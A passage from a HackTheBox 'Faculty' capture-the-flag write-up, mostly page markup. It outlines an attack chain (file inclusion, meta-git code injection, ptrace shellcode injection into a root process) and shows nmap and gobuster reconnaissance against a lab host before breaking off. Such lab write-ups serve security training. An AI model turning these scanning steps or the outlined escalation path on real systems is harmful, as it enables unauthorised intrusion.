<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">pL4StiC - HtB Faculty</title>
<meta property="og:title" content=pL4StiC&#32;-&#32;HtB&#32;Faculty />
<meta name="twitter:title" content=pL4StiC&#32;-&#32;HtB&#32;Faculty />
<meta itemprop="name" content=pL4StiC&#32;-&#32;HtB&#32;Faculty />
<meta name="application-name" content=pL4StiC&#32;-&#32;HtB&#32;Faculty />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://pL4sTiC1337.github.io/writeups/htb-faculty/" />
<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-faculty/" itemprop="url" />
<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-faculty/" />
<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-faculty/" />
<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-faculty/" />


<meta property="og:updated_time" content="2025-02-11T14:32:53-05:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@pL4sTiC1337" />
    <meta name="twitter:creator" content="@pL4sTiC1337" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.143.1">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://pL4sTiC1337.github.io/">
                <img src="/images/pl4stic.png" alt="brand image">
            </a>
        
        
            <a href="https://pL4sTiC1337.github.io/">
                <h1>pL4StiC</h1>
            </a>
        
    </h1>
    <p class="lead">
    My Ramblings...
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
                            </li>
                        
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/writeups/">Writeups</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-escape/">HtB Escape</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-giddy/">HtB Giddy</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-faculty/">HtB Faculty</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-jab/">HtB Jab</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-hospital/">HtB Hospital</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>





    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
        </svg>
    </a>




    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
        </svg>
    </a>










    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>





        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://pL4sTiC1337.github.io/writeups/htb-faculty/">HtB Faculty</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-02-11T14:32:53-0500" class="post-date">
        February 11, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>9 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-writeup">
        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
      </li>
      
      <li class="tag-hackthebox">
        <a href="https://pL4sTiC1337.github.io/tags/hackthebox">hackthebox</a>
      </li>
      
      <li class="tag-medium">
        <a href="https://pL4sTiC1337.github.io/tags/medium">medium</a>
      </li>
      
      <li class="tag-linux">
        <a href="https://pL4sTiC1337.github.io/tags/linux">linux</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <p><img src="/images/Faculty.png" alt="HtB Faculty"></p>
<p>Faculty is a medium Linux machine that features a PHP web application that uses a library which is vulnerable to local file inclusion. Exploiting the LFi in this library reveals a password which can be used to log in as a low-level user called <code>gbyolo</code> over SSH. The user <code>gbyolo</code> has permission to run an <code>npm</code> package called <code>meta-git</code> as the <code>developer</code> user. The version of the <code>meta-git</code> installed on this box is vulnerable to code injection, which can be exploited to escalate the privileges to the user <code>developer</code>. The privilege escalation to <code>root</code> can be performed by exploiting the <code>CAP_SYS_PTRACE</code> capability to inject shellcode into a process running as <code>root</code>.</p>
<hr>
<h2 id="scanning">Scanning</h2>
<h3 id="nmap">nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/faculty<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A 10.129.227.208
</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-11 10:40 EST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.208
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.028s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://faculty.htb
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running: Linux 4.X|5.X
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
</span></span><span style="display:flex;"><span>OS details: Linux 4.15 - 5.19
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id="nginx-1180---80tcp">nginx 1.18.0 - 80/tcp</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/faculty<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://faculty.htb/ -w /usr/share/wordlists/dirb/big.txt 
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://faculty.htb/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
